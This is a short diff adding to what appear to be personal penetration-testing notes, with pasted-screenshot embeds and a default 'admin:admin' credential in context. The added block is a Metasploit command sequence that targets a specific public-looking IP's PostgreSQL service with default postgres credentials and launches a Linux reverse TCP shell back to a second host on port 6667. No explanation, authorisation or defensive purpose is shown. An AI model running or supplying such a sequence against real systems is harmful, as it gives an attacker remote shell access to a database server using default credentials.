@@ -254,3 +254,25 @@ admin:admin
 
 ![[Pasted image 20260410173229.png]]
 
+```
+use exploit/linux/postgres/postgres_payload
+
+set RHOSTS 18.158.110.24
+set USERNAME postgres
+set PASSWORD postgres
+set DATABASE postgres
+
+set PAYLOAD linux/x64/shell_reverse_tcp
+
+set LHOST 212.129.9.19
+set LPORT 6667
+
+set TARGET 1
+
+exploit
+```
+
+![[Pasted image 20260410181605.png]]
+
+![[Pasted image 20260410181616.png]]
+
